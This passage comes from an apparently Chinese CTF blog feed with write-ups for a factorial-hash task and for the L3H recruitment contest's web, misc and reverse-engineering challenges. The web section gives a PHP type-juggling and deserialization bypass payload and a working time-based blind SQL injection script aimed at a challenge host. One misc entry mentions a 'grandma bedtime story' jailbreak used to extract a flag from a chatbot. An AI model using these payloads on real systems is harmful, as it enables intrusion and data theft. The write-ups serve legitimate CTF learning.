class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> <span class="token operator">*</span>upper <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">28</span> <span class="token operator">+</span> <span class="token number">5</span> res <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> upper <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">*=</span> iflag <span class="token operator">=</span> <span class="token string">'Beginctf&#123;'</span> <span class="token operator">+</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是需要优化算法，加快阶乘的计算，没看懂OEIS2的题目是什么意思，我查表没查出来，也不会手搓优化算法</p><p>我直接sagemath挂着跑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256x <span class="token operator">=</span> gamma<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">28</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#c60a2e5c9e9572ed848776f282a9c90d6ca0fe29f8308b0b9b43c61d493133e9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3H招新赛个人WP</title>
      <link href="/2023/10/14/L3h%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/"/>
      <url>/2023/10/14/L3h%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h1><h2 id="phpplayer"><a class="markdownIt-Anchor" href="#phpplayer"></a> phpplayer</h2><p>Payload:/?a[]=1&amp;b[]=2&amp;c[]=3&amp;d[1.01=4&amp;fake_flag=flag&amp;flag=1&amp;obj=O:4:“test”:2:{s:1:“a”;s:3:“abc”;}<br />flag=1</p><p>1.弱类型比较漏洞  将a设置为一个数组 绕过第一个和第二个if<br />2.根据md5特性  数组无法比较md5值  将b c 都设置为数组可绕过md5验证<br />3.get post flag=flag 绕过这个一个if<br />4.需要让 d_1.01 变量存在才能绕过这个if  但是这个变量命名不符合规则  csdn搜索遇到类似的<br />将d设置为包含子数组的参数 可以使条件成立 构造 d[1.01=1] 绕过这个if<br />5.反序列化漏洞   构造obj参数   修改属性数  绕过这个if<br />obj=O:4:“test”:2:{s:1:“a”;s:3:“abc”;}<br />6.将fake_flag 全局变量设置 为 flag 读取flag内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php    <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">&#123;</span>        public $a<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    $a <span class="token operator">=</span> new test<span class="token punctuation">;</span>    echo serialize<span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token comment"># O:4:"test":1:&#123;s:1:"a";s:3:"123";&#125;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ilikesleep"><a class="markdownIt-Anchor" href="#ilikesleep"></a> ilikesleep</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> httpx<span class="token keyword">import</span> timeURL <span class="token operator">=</span> <span class="token string">"http://webt2.chall.ctf.l3hsec.com/index.php"</span>alis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span><span class="token punctuation">]</span>rlis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">+</span> alis<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token builtin">bool</span><span class="token punctuation">:</span>    test_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        httpx<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span>data<span class="token operator">=</span>test_data<span class="token punctuation">)</span>    <span class="token keyword">except</span> httpx<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>column_length<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>column_length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> rlis<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1'\tunion\tselect\tnull,null,if(substr((select\tgroup_concat(flag)\tfrom\tflag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">',benchmark(30000000,sha(1)),1)#"</span></span>            <span class="token keyword">if</span> test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>                flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> flag<span class="token keyword">print</span><span class="token punctuation">(</span>attack<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1><h2 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64？</h2><p>我的密文: ox6qJI1Q7kJY1OvuR/1CBs1yRVvuEIfeR/lCUMAGrV8LwEL=<br />泄露的明文: jRQfVJMwco5wegcVY3cAFi5a7V97IIWMgNh/epeit8Prp1+vdved0CzndIyCqfEMvho3YF33SYjeif4oi0mGscBFhRH70i17E8IgGAVXtZGDhSK9vPkH5MhI<br />泄露的密文: N+d9r+rjVElQoG1krPlQ1+MG8LvXNV1p658u6L+d1L5aVsFKrEA+NEUhB/dYRTfIr/r+rxAx7suMTE+xJPrvVErqoG6r9QRGB5+0rP+s6XSWRX5/JI6m9spTTxJYNVnk9VpdrLlA1+pLPMlnNv6zbErUNLF5VPpd<br />你现在知道我的明文了吗？</p><p>wp:  根据题意 密文长度是明文长度的1.5倍可推测出是base64加密<br />但是常规的base64解密无法得出答案<br />根据泄露的明文和密文可以推测出 原来的base64码表被替换<br />所以需要根据明文和密文破解出 替换后的码表<br />由于写脚本水平太差 TmT  我半手动半脚本破解了码表：）  过程如下<br />根据base64的特性   把明文的ASCII值转为8位二进制</p><p>然后用python分为六个一组 计算出相应的数值 然后与字符 对应就得到了码表<br />不过不完整</p><p>然后替换码表进行base64解密<br />由于码表还不全  我写脚本的能力太差   然后我4个一组  暴力猜测手动试出了可读的字符  得到了flag TmT…</p><pre class="line-numbers language-none"><code class="language-none">import base64import stringstr1 &#x3D; &quot;ox6q JI1Q 7kJY 1Ovu R&#x2F;1C Bs1y RVvu EIfe R&#x2F;lC UMAG rV8L wEL&#x3D;&quot;string1 &#x3D; &quot;yAmxnvX&#x2F;wdjzR6b2U9TVB1PE8rNoJl7CFpOQM+saqW022feKY22GL5Ikhu222S22&quot;string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把未知的码表替换为2  然后暴力破解出可读的字符<br />最终结果：  b’l3hsec{w0W!y0u_Re@11y_kn0w_B@se64!}’</p><p>我属于是编程水平太差，人肉爆破的，这里po一下南小鸟师傅的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">diybase64_encode</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">map</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'08b'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> source<span class="token punctuation">)</span>    paddinglen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span>    tmp <span class="token operator">=</span> binary_str <span class="token operator">+</span> paddinglen <span class="token operator">*</span> <span class="token string">'00'</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp1 <span class="token operator">=</span> tmp<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span>        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token builtin">map</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">map</span>m <span class="token operator">=</span> <span class="token string">'jRQfVJMwco5wegcVY3cAFi5a7V97IIWMgNh/epeit8Prp1+vdved0CzndIyCqfEMvho3YF33SYjeif4oi0mGscBFhRH70i17E8IgGAVXtZGDhSK9vPkH5MhI'</span>c <span class="token operator">=</span> <span class="token string">'N+d9r+rjVElQoG1krPlQ1+MG8LvXNV1p658u6L+d1L5aVsFKrEA+NEUhB/dYRTfIr/r+rxAx7suMTE+xJPrvVErqoG6r9QRGB5+0rP+s6XSWRX5/JI6m9spTTxJYNVnk9VpdrLlA1+pLPMlnNv6zbErUNLF5VPpd'</span><span class="token builtin">map</span> <span class="token operator">=</span> diybase64_encode<span class="token punctuation">(</span>m<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token builtin">map</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到新的base64表，注意到没有flag密文中的一些字符，爆破。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ci <span class="token operator">=</span> <span class="token string">'ox6qJI1Q7kJY1OvuR/1CBs1yRVvuEIfeR/lCUMAGrV8LwEL='</span><span class="token triple-quoted-string string">'''for i in ci:    if i not in map:        print(i)'''</span>lostChar <span class="token operator">=</span> <span class="token string">'OCyew'</span>lostPart <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>lostPart<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    tmpMap <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lostChar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmpMap<span class="token punctuation">[</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> lostChar<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    flag <span class="token operator">=</span> diybase64_decode<span class="token punctuation">(</span>ci<span class="token punctuation">,</span> tmpMap<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'kn0w_B@se64!&#125;'</span> <span class="token keyword">in</span> flag <span class="token keyword">and</span> <span class="token string">'l3hsec&#123;w0W!y0u'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="真的不用对脑洞"><a class="markdownIt-Anchor" href="#真的不用对脑洞"></a> 真的不用对脑洞</h2><p>跨过这两道栅栏，培根转身看不到摩斯，只看到了一堆贝斯</p><pre class="line-numbers language-none"><code class="language-none">8FUlS64u6kfnkWTRhWhdeWRds8DYw09nfHv07UBU73Up9AVuus1VIU0XBxaEUHooUMFGBkt4RfrMLeMbDCFhMakuFA1lzp0Sao8aUwZicJ8rLj6CDxYNBFUOQTuJ4EYmdTAAofTsBEYT3xvOKCbsRHJ2IP1nThBN9M4Q5glFsDSCx06CgzvkEy4RSdFRAWOrMVRcZTZMz4dl5gfJ6xUCAtLvW73nD5hnBogRc42jLpw7hFx9sUfFcAhGGXjEwGEOEJy8rs9MRkBgKQOy1YxJ74fnbAGSXTp4d99aLGSBDyxkLufiSdfWEdA3F62C9SN8qWuyvjo0O824RvlqISyhwOygq8QleUXdallrNYi4gXZBA0GZ1fhBuFF3PMuX1W7dKsh4nw65FUeuwcg67mVv1egoo67JdcNo3mLh3vzydJhyTXGcwwe4MnbQEYyg6NQKfFKUe8acJMUxpBUAtJebjomEaODkxDZzHPwSBKPyKwnCCAoaQEYnVZ0ePPDSpsm0DXb4WjyfXalsudNbS9ghrhnlofKe2tBK98qPSpm1haTA2Xrl7WOXTLD6mgf7Hz0GTzfKpY0P3r0W8VnjUi3Zz0qISytGey0yFA1Ic0dslEHz1QjbP91D9bYJYJlP0QdQB7q9zJ7Mx7b1qS3V4qKoXv8pZ72A1KKyACrjQ0OMxb7VXmwYP7taYpYsmgdArc20u6zvHyuqCZT9waCNQ3rc9KKvrO2mR5ZL2jvBeiVUWraM2seagF5rcQ956DyC3TArAyvQd5zpe3eV3tEGE000QsUOBIIaX4V2WTWp8o91JU9YTl8lJ9sohu5jvoaUnvsWFBsvf6fFk8odUCKCueTiVYf3wWqD66X2Li9MMRa0pXuWD8cyYKGdQFuVWdjXHSueYk1u8kEhUpeE9EH5CF5YSnAWgYxPZVDFRpMbHH4NvzR68BRCE53h2ZalKdmm7Vd4lUmUTsKQNTWIj2iGZcnk7nZf7igefun3lqMy7TNwhFMtwVMStMlEYND6DW8LFQNrX9RkJAvVXbBVhSiLZpXoGPaBlk856cXzx2c2CjnTwUCceQhsqRvVOhedvlWR7qUX7R3gjcSXBSUw6fJBskGwvgA0m3qfpCzfS7rBFN9Ayogcuqw7HPluhaGXqDGpH8s1nthQ67klVDJmlhPe19aCclFNN4tfyEpAeOOq09jGOSZjnVmUU3EIcxJcnD4fMNbYvXQ9893LpLZYoNEX4aG8pnDtSxHBDUwMRRXZ8FAAUThUiIOT933sy6rMCj1pLxZ5Q4qvN0b3aUzTvt0jOnqDypygaFK1dXOCEatTRrAW9ElJJkZYUv31m12iU06LhapQy9DCntDahiwQMtEkmBlNdjgNPuNeMD8miRQDcEnvjqM5CXhNiSZa1dvtG7DhyQ7lpbILclMyrP85Xh7Dny28eoEwMZGq3tG0sNOGKFm97tktMQdhLz6xvXN2Z1pBbIWOWPYu7X40VfBojUZclnkK7xaNTgCJ40gVp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用basecrack脚本多次base解码后得到这个</p><pre class="line-numbers language-none"><code class="language-none">-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;-.&#x2F;-.&#x2F;---&#x2F;---&#x2F;---&#x2F;-.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>翻译莫斯电码</p><pre class="line-numbers language-none"><code class="language-none">NNONNONNONNOONONONNNNONNONNNONNOOONNNNONOONNNONNNONNNONOONNNNONOONOOOONNNNNONNOOONNONNOOON<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5个一组</p><pre class="line-numbers language-none"><code class="language-none">AABAA BAABA ABBAB ABAAA ABAAB AAABA ABBBA AAABA BBAAA BAAAB AAABA BBAAA ABABB ABBBB AAAAA BAABB BAABA ABBBA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>培根密码解码    E S N I J C O C Y R C Y L P A T S O   E T O I K C P C  S C  M Q A U T P</p><p>根据跨过两道栅栏可以  将其分为两个一组<br />ES NI JC OC YR CY LP AT SO<br />每组先读取首字母得到  ENJOYCLASSICCRYPTO</p><h2 id="chatsignin"><a class="markdownIt-Anchor" href="#chatsignin"></a> chatsignin</h2><p>奶奶的睡前flag故事</p><h2 id="robot36"><a class="markdownIt-Anchor" href="#robot36"></a> robot36</h2><p>010editor打开，看到cover.png结尾有东西</p><p><img src="https://www.nssctf.cn/files/2023/10/15/4dd83d9bfc.png" alt="image-20231013183318474" / loading="lazy"></p><p>查到wav文件头是RIFF，找到后删去前面的内容，另存为1.wav。然后用robot36处理。</p><p><img src="https://www.nssctf.cn/files/2023/10/15/2b2181d0dd.png" alt="20231003_141119" / loading="lazy"></p><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> re</h1><h2 id="pyencode"><a class="markdownIt-Anchor" href="#pyencode"></a> pyencode</h2><p>gpt秒了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">restore_string</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        nums <span class="token operator">=</span> ret<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span>        num1_high <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">3</span>        num1_low <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">3</span>        num2_low <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        num2_high <span class="token operator">=</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0b00000111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span>        num2 <span class="token operator">=</span> num2_high<span class="token operator">+</span>num2_low        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num1_high<span class="token operator">+</span>num1_low<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> sret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span>result <span class="token operator">=</span> restore_string<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" 